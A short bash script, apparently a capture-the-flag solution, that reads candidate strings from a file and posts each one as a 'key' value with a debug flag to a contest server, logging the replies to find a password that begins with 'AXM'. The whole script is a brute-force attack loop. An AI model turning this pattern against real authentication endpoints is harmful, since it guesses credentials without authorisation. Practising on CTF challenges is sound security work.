#! /bin/bash
# start of pass is AXM
cat $1 |while read line;do
	echo $line >> output
	curl --data key=$2$line\&debug https://ctf.fluxfingers.net:1316/gimmetv >> output
	
	echo '\n' >> output

done  
